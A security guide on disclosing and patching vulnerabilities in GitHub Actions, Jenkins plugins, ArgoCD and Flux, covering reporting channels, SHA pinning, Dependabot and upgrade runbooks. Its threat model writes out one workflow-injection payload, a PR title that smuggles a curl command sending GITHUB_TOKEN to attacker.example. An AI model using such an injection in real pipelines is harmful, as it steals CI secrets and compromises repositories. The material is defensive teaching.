---
title: "Open Source CI/CD Security Disclosure: Reporting Vulnerabilities in Actions, Jenkins Plugins, and ArgoCD"
description: "GitHub Actions marketplace actions, Jenkins plugins, and GitOps tools like ArgoCD are high-impact supply chain targets — a compromised action runs with access to your build secrets and source code. This guide covers how to report vulnerabilities in CI/CD tools, what the disclosure processes look like for each ecosystem, and how pipeline maintainers should respond when a vulnerability drops in a tool they depend on."
slug: oss-cicd-security-disclosure
date: 2026-05-08
lastmod: 2026-05-08
category: cicd
tags:
  - open-source-security
  - github-actions
  - jenkins
  - argocd
  - responsible-disclosure
personas:
  - security-engineer
  - platform-engineer
article_number: 684
difficulty: Intermediate
estimated_reading_time: 13
published: true
layout: article.njk
permalink: /articles/cicd/oss-cicd-security-disclosure/
---

# Open Source CI/CD Security Disclosure: Reporting Vulnerabilities in Actions, Jenkins Plugins, and ArgoCD

## Problem

CI/CD pipelines are where your code, your secrets, and your deployment authority converge. A vulnerability in a GitHub Actions action, a Jenkins plugin, or ArgoCD is not an abstract software bug — it is a direct path to your AWS credentials, your signing keys, your GITHUB_TOKEN, and the build artifacts you ship to customers.

The threat is structural. Your pipeline trusts these tools completely. A compromised action runs in the same execution environment as your secrets. A vulnerable Jenkins plugin can be triggered by an unauthenticated attacker. ArgoCD, which holds cluster-admin access, translates a single CVE into full cluster compromise. Unlike application vulnerabilities, CI/CD vulnerabilities operate upstream of every downstream security control you have.

### The GitHub Actions ecosystem problem

The GitHub Actions Marketplace hosts tens of thousands of community-maintained actions. There is no mandatory security review before publication. There is no official CVE process managed by GitHub for every action — an action published by an individual maintainer is governed only by whatever security practices that person applies. Maintainer responsiveness varies enormously: some respond within hours; others are effectively unmaintained.

The most common vulnerability class in Actions is workflow expression injection. GitHub Actions passes repository data into workflow files using `${{ }}` expressions. When attacker-controlled values — a PR title, a branch name, an issue body — flow into a `run:` step without sanitisation, an attacker can inject shell commands that execute in the context of your runner with access to all secrets exposed to that job. This vulnerability pattern appears repeatedly across popular actions because the trigger is subtle and there is no static analysis built into the Actions editor by default.

### Jenkins plugin sprawl

The Jenkins plugin ecosystem contains more than 1,800 plugins. Many are maintained by a single developer who may no longer be actively engaged with the project. The Jenkins Security Team tracks and publishes vulnerabilities through Jenkins Security Advisories, but coverage depends on researchers reporting issues and maintainers responding. Plugins that are abandoned or minimally maintained accumulate unpatched vulnerabilities for months or years. The attack surface is broad: each plugin that installs into your Jenkins controller runs with the full permissions of the Jenkins process.

### ArgoCD's privileged position

ArgoCD holds a structurally unique position: it continuously reconciles Kubernetes cluster state, which requires extensive API access. Most production installations bind the ArgoCD application controller service account to a ClusterRoleBinding with broad permissions — often effectively cluster-admin. A vulnerability in ArgoCD is not a pipeline vulnerability. It is a Kubernetes cluster compromise. When CVE-2022-24348 allowed path traversal enabling tenant escape in multi-tenant ArgoCD deployments, any attacker who had access to create an ArgoCD Application could reach another tenant's secrets. The blast radius was the entire cluster.

---

## Threat Model

### Workflow injection in a popular GitHub Actions action

A security researcher audits a widely used third-party action — one that processes pull request metadata and posts a comment with results. The action passes `${{ github.event.pull_request.title }}` directly into a `run:` step:

```yaml
- name: Post result
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker opens a pull request with the title `"; curl https://attacker.example/exfil?t=$GITHUB_TOKEN; echo "`. When the action runs on `pull_request_target` (which has access to secrets even for fork PRs), the GITHUB_TOKEN is exfiltrated. The token can then be used to push to the repository, create releases, or read private packages. The action may be used by thousands of repositories — the researcher has found a cross-cutting vulnerability requiring coordinated disclosure.

### Jenkins plugin unauthenticated RCE

A plugin that processes XML build configuration files uses an XML parser without disabling external entity resolution. An unauthenticated attacker sends a crafted HTTP request to a Jenkins endpoint exposed by the plugin, triggering server-side request forgery or arbitrary file read. On Jenkins instances with the Script Console accessible to the plugin's processing path, this escalates to remote code execution. The plugin has 50,000 installations. Each one is vulnerable until the plugin is updated.

### ArgoCD tenant escape via application controller

A multi-tenant ArgoCD installation allows different teams to manage their own Applications within dedicated AppProjects. A vulnerability in the application controller allows a specially crafted Application spec to reference secrets from a namespace outside the AppProject's allowed destination namespaces. A tenant with legitimate access to create Applications in their project can read another tenant's Kubernetes secrets, including database credentials and API keys.

---

## Configuration / Implementation

### GitHub Actions security disclosure

**Reporting a vulnerability in a GitHub Actions action:**

The correct path is GitHub's private vulnerability reporting system. Navigate to the action's source repository on GitHub, go to Security → Report a vulnerability. This creates a private security advisory that is visible only to the repository maintainers and the reporter. It does not expose the vulnerability publicly.

If the repository has not enabled private vulnerability reporting, you have two options: contact the maintainer directly via email if it is listed in the repository, or report to the GitHub Security Lab at `securitylab@github.com`. The GitHub Security Lab actively finds vulnerabilities in GitHub Actions and coordinates disclosure for high-impact cases.

**What happens after disclosure:**

The repository maintainer reviews the report and creates a fix. GitHub assigns a CVE through its role as a CVE Numbering Authority (CNA). When the fix is released, the security advisory is published and appears in the GitHub Advisory Database (GHSA), which feeds Dependabot and other vulnerability scanners. If the maintainer does not respond within a reasonable window (typically 90 days is the standard coordinated disclosure timeline), consider escalating to the GitHub Security Lab.

**As a user: detecting vulnerable actions:**

Enable Dependabot for Actions in your repository. Dependabot reads your workflow files, identifies the actions and versions in use, and opens pull requests when a newer version is available or when a known vulnerability is published. Add a `dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

Pin actions to their full commit SHA rather than a mutable tag:

```yaml
# Vulnerable: tag can be moved by attacker who compromises action maintainer's account
- uses: actions/checkout@v4

# Safe: SHA cannot be changed without it being a different commit
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

The `step-security/harden-runner` action installs an eBPF-based agent on the runner that monitors network egress and file system access. It can detect unexpected outbound connections from a compromised action — for example, a curl to an attacker-controlled domain — and block or alert on them.

**Workflow injection: why it is common and how to report it:**

Workflow injection is common because the syntax encourages direct interpolation. The fix is to pass untrusted values as environment variables rather than direct expressions in `run:` steps:

```yaml
# Vulnerable
- run: echo "${{ github.event.pull_request.title }}"

# Safe: value is an env var, shell does not interpret it as commands
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

When reporting a workflow injection vulnerability in an action, document the data flow from the untrusted input to the `run:` step, the trigger that makes it exploitable (particularly `pull_request_target` for fork PRs), and a proof of concept that demonstrates the injection without exfiltrating real credentials.

---

### Jenkins security disclosure

**Reporting to the Jenkins Security Team:**

Email `security@jenkins.io` with a description of the vulnerability, the affected plugin name and version, reproduction steps, and your assessment of impact. The Jenkins Security Team triages reports, contacts the plugin maintainer, and coordinates the fix. For Jenkins core vulnerabilities, the same address applies.

Jenkins uses JIRA for security issue tracking. After initial triage, the security team creates a private JIRA issue and works with the maintainer to produce a fix. When a fix is available, the Jenkins Security Advisory is published at `www.jenkins.io/security/advisories/`. Subscribe to the RSS feed for that page — it is the primary notification channel.

**Checking plugin health before installation:**

The Jenkins Plugin Site at `plugins.jenkins.io` displays a plugin health score. Before installing a plugin, check: the last release date, the number of open issues, whether it has an active maintainer listed, and whether it appears in any existing security advisories. Prefer plugins maintained by the Jenkins project organisation over single-maintainer community plugins for critical pipeline functionality.

**Responding to a Jenkins plugin CVE:**

1. Check whether you have the plugin installed: `Manage Jenkins → Plugins → Installed Plugins`, or query via the Jenkins CLI: `java -jar jenkins-cli.jar -s http://jenkins.example.com list-plugins`.
2. Identify the fixed version from the security advisory.
3. If a fix is available, update through `Manage Jenkins → Plugins → Updates`. Test in a non-production Jenkins instance first.
4. If no fix is available, assess whether to disable the plugin. Go to `Manage Jenkins → Plugins → Installed Plugins`, find the plugin, and uncheck `Enabled`. Disabling removes its contribution to Jenkins without uninstalling it.
5. If the vulnerability allows unauthenticated access and you cannot patch immediately, restrict network access to your Jenkins instance at the firewall or load balancer level.

---

### ArgoCD security disclosure

**Reporting to the ArgoCD security team:**

ArgoCD is a CNCF project. Report vulnerabilities to `cncf-argocd-security@lists.cncf.io`. Include a description, affected versions, reproduction steps, and impact assessment. The ArgoCD security team also accepts reports via GitHub private security advisories at `github.com/argoproj/argo-cd/security/advisories/new`.

The ArgoCD team follows a structured disclosure process: triage within 3 business days, CVE assignment via the CNCF CNA, a private patch development period, coordinated disclosure with a release, and public advisory publication.

**ArgoCD security advisories:**

Monitor `github.com/argoproj/argo-cd/security/advisories` for published advisories. Subscribe to the repository's GitHub notifications for security advisory events. The ArgoCD Slack channel (`#argo-cd` in the CNCF Slack) typically carries announcements when significant CVEs are published.

**ArgoCD vulnerability patterns:**

- **Application controller privilege escalation**: Vulnerabilities that allow an Application spec to affect resources outside the declared destination namespace or project scope.
- **Web terminal RCE**: ArgoCD includes a web terminal feature that opens a shell into deployed pods. Vulnerabilities in this path can allow unauthorized shell access.
- **SSRF via repo server**: The ArgoCD repo server fetches content from Git repositories and Helm registries. SSRF vulnerabilities allow an attacker to pivot to internal services using the repo server as a proxy.
- **Multi-tenancy escape**: AppProject constraints are enforced by the ArgoCD API server. Bypasses in AppProject validation allow cross-tenant access.

**Emergency ArgoCD patching — zero-downtime procedure:**

```bash
# Check current version
argocd version --client
kubectl get deployment argocd-server -n argocd -o jsonpath='{.spec.template.spec.containers[0].image}'

# Update the ArgoCD install manifest to the patched version
# Using kubectl kustomize / Helm / or direct manifest

# If using the install.yaml approach:
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/v2.x.y/manifests/install.yaml

# Verify rollout
kubectl rollout status deployment/argocd-server -n argocd
kubectl rollout status deployment/argocd-repo-server -n argocd
kubectl rollout status deployment/argocd-application-controller -n argocd

# Confirm version post-patch
kubectl get pods -n argocd -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[0].image}{"\n"}{end}'
```

For GitOps-managed ArgoCD installations (ArgoCD managing itself), update the version tag or SHA in the Git repository. ArgoCD will reconcile the change. Verify that application sync resumes after the upgrade — occasionally API changes between versions require updated Application specs.

---

### Flux CD security disclosure

Flux CD is the other major CNCF GitOps runtime. Report vulnerabilities to `cncf-flux-security@lists.cncf.io` or via GitHub private security advisories at `github.com/fluxcd/flux2/security/advisories/new`. Monitor published advisories at `github.com/fluxcd/flux2/security/advisories`.

Flux has experienced supply chain vulnerabilities in its source controller component — the component responsible for fetching Git repositories and Helm charts. The source controller processes external content with elevated Kubernetes API access; vulnerabilities in content parsing or network fetching have broader impact than a typical application vulnerability.

---

### As a researcher: responsible disclosure

**Testing CI/CD tools safely:**

Never test exploitation of CI/CD vulnerabilities on third-party infrastructure. Run a local Jenkins instance, a local ArgoCD cluster (minikube or kind), or a private GitHub organisation with test repositories. Most CI/CD tools are easily self-hosted for research purposes.

If a tool has a formal bug bounty program, operate within its scope. GitHub has a bug bounty program that covers GitHub Actions infrastructure (though not necessarily individual community actions). The Jenkins project does not currently have a paid bug bounty program; coordinated disclosure is expected.

**Scoping your proof of concept:**

Demonstrate the impact without causing harm. For a secrets exfiltration vulnerability, show that you can access the environment where secrets would be present, or demonstrate the code path that would reach them — do not actually exfiltrate real credentials. For an RCE vulnerability, demonstrate code execution with a benign payload (write a file, make a DNS request to a controlled domain) rather than establishing a persistent shell.

Document the following in your report: the vulnerable version range, the steps to reproduce, the impact (what an attacker gains), and a suggested fix or mitigation. A well-structured report significantly reduces the time from disclosure to patch.

**Cross-cutting vulnerabilities:**

When a vulnerability affects a shared library used by multiple projects — for example, a GitHub Actions toolkit vulnerability affecting dozens of actions that depend on `@actions/core` — coordinate with all affected maintainers simultaneously or report to the shared dependency's maintainers first. Alert GitHub Security Lab in these cases; they have experience coordinating multi-project disclosures. Establish a disclosure timeline that gives all maintainers enough time to patch before any information is made public.

---

### As a CI/CD platform team: staying current

**Tracking CI/CD CVEs:**

- Jenkins Security Advisories RSS: `www.jenkins.io/security/advisories/rss.xml` — add to your RSS reader or pipe into a Slack channel with an RSS-to-webhook integration.
- ArgoCD GitHub Security Advisories: Watch the `argoproj/argo-cd` repository on GitHub and select `Security alerts` in your notification settings.
- Flux CD advisories: Watch `fluxcd/flux2` similarly.
- GitHub Advisory Database: `github.com/advisories?query=ecosystem%3Agithub-actions` for Actions-specific advisories.
- OSV.dev: The Open Source Vulnerabilities database aggregates advisories across ecosystems including GitHub Actions (`github.com/osv-schema`) and has a queryable API.

**Automated detection:**

Configure Dependabot for both Actions and plugins:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      github-actions:
        patterns: ["*"]
```

Renovate Bot supports Jenkins plugins via its `jenkins` manager and can be configured to open pull requests when plugin versions with known vulnerabilities are detected. Enable `vulnerabilityAlerts` in your Renovate configuration.

For ArgoCD and Flux, use image update automation with digest pinning. Pin to SHA digests rather than version tags in your GitOps manifests, and use Dependabot or Renovate to open pull requests when new digests are available for the same tag.

**Response runbook:**

Define in advance who acts when a critical CI/CD CVE drops:

1. **Detection**: Automated alert from Dependabot, RSS feed, or security advisory subscription.
2. **Triage** (within 1 hour for critical CVEs): Platform engineer confirms whether the vulnerable component is installed and in use, assesses exploitability given your network configuration.
3. **Communication**: Notify the security team and engineering leadership. For critical CVEs with active exploitation, treat as an incident.
4. **Remediation**: Apply the patch in staging, verify pipeline functionality, apply to production. For Jenkins, test in a non-production controller first. For ArgoCD, verify application sync health after upgrade.
5. **Rollback**: Document the previous working version. For Jenkins, the plugin manager retains the previous plugin `.jpi` file. For ArgoCD, keep the previous install manifest tagged in your GitOps repository so a rollback is a single Git revert.
6. **Post-incident review**: Did the detection mechanism work? How long between advisory publication and patch application?

---

## Expected Behaviour

The following table summarises the disclosure process and expected response timeline for each major CI/CD ecosystem:

| Tool | Reporting Channel | Advisory Source | Consumer Response Target | Patch Path |
|---|---|---|---|---|
| GitHub Actions (action) | GitHub private security advisory or `securitylab@github.com` | GitHub Advisory Database (GHSA) | Dependabot PR within 24h of advisory | Update SHA pin in workflow file |
| Jenkins core | `security@jenkins.io` | jenkins.io/security/advisories | Manual or automated plugin update | `Manage Jenkins → Updates` |
| Jenkins plugin | `security@jenkins.io` | jenkins.io/security/advisories | Manual or Renovate PR | `Manage Jenkins → Updates` or disable plugin |
| ArgoCD | `cncf-argocd-security@lists.cncf.io` or GitHub private advisory | github.com/argoproj/argo-cd/security/advisories | Update manifests within 24h of critical advisory | `kubectl apply` new manifests or GitOps PR |
| Flux CD | `cncf-flux-security@lists.cncf.io` or GitHub private advisory | github.com/fluxcd/flux2/security/advisories | Update manifests within 24h of critical advisory | `kubectl apply` new manifests or GitOps PR |

For critical severity CVEs (CVSS 9.0+), the target response time — from advisory publication to patch deployed in production — should be 24 hours. For high severity (CVSS 7.0–8.9), target 72 hours. For medium and below, target the next standard maintenance window.

---

## Trade-offs

**Action version pinning vs automatic security updates:**

Pinning actions to full commit SHAs prevents a supply chain attack where a maintainer's account is compromised and a malicious tag is pushed. However, SHA pinning means Dependabot must open a pull request for every update, including security patches. The trade-off is worth it: SHA pinning with Dependabot automation gives you both supply chain integrity and timely security updates. Tags without SHA pinning give you neither — a compromised maintainer account can silently modify what `@v4` points to.

**Plugin minimisation vs feature requirements:**

Every Jenkins plugin is attack surface. A plugin that has not been updated in two years and is maintained by one person represents sustained technical debt. Evaluate whether each plugin's functionality could be replaced with a pipeline script, an external tool called via `sh`, or a more actively maintained alternative. The security cost of a rarely-updated plugin often exceeds the convenience cost of replacing it.

**Emergency upgrade risk vs vulnerability exposure:**

Upgrading ArgoCD or Jenkins under time pressure introduces its own risk. A bad upgrade can break application sync, corrupt job configurations, or lose plugin state. However, leaving a critical vulnerability unpatched on an internet-exposed CI/CD system is generally the higher risk. The mitigation is preparation: maintain upgrade runbooks before you need them, keep rollback snapshots or the previous manifest version readily available, and test upgrades in a non-production environment first.

---

## Failure Modes

**Jenkins advisory missed due to no RSS subscription.** Teams that do not actively monitor `jenkins.io/security/advisories` learn about vulnerabilities through secondary sources — a blog post, a Slack message, a customer report. In some cases they learn when they are exploited. The Jenkins Security Advisory RSS feed is not subscribed by default anywhere; it requires a deliberate operational decision to monitor it.

**Action version pinned to a tag that was moved.** A workflow using `- uses: some-action/toolkit@v2` without a SHA pin is pinning to a mutable reference. If the action maintainer's account is compromised, the attacker can push a new commit to the `v2` tag. All repositories that run the action after that point execute the attacker's code. The tag-based pin provided false confidence without the actual protection of SHA pinning.

**ArgoCD upgrade breaking application sync.** Between major ArgoCD versions, the Application CRD schema occasionally changes. An upgrade that is not tested against your actual Application specs can result in sync errors that halt all deployments. In an emergency patching scenario with time pressure, this can cause a prolonged outage. Mitigation: run `argocd app diff` against all applications before the upgrade and validate that the new version accepts the existing specs.

**Researcher going public when no SECURITY.md exists.** A researcher discovers a critical vulnerability in a popular action. The repository has no SECURITY.md, no private vulnerability reporting enabled, and no contact information for the maintainer. After attempting to file a public issue (realising too late that this discloses the vulnerability), the researcher has inadvertently published a zero-day. As a maintainer, add a `SECURITY.md` to every public repository that your pipeline depends on — and enable GitHub's private vulnerability reporting. As a researcher, if no reporting channel is available, escalate to GitHub Security Lab before considering any public disclosure.

---

## Summary

CI/CD tools are infrastructure-layer attack surface. Vulnerabilities in GitHub Actions actions, Jenkins plugins, and ArgoCD are not theoretical — they are exploited paths to secrets, build artifacts, and cluster control. Effective security requires both sides of the disclosure process: researchers who report responsibly through the correct channels, and platform teams who subscribe to advisories, automate detection, and execute patch runbooks without having to figure them out under pressure.

The practical baseline: subscribe to Jenkins Security Advisory RSS, watch ArgoCD and Flux security advisories on GitHub, configure Dependabot for Actions with SHA pinning, and write down your emergency upgrade procedure before you need it.
